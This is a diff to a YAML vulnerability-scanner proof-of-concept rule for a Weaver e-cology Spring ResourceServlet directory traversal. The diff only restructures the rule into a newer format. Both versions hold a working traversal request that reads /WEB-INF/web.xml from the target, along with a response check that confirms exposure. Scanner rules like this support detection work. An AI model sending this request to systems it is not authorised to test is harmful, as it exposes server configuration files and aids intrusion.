@@ -1,11 +1,16 @@
 name: poc-yaml-ecology-springframework-directory-traversal
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+expression: r0()
 detail:
-  author: l1nk3r
-  links:
-    - https://www.weaver.com.cn/cs/securityDownload.asp
+    author: l1nk3r
+    links:
+        - https://www.weaver.com.cn/cs/securityDownload.asp
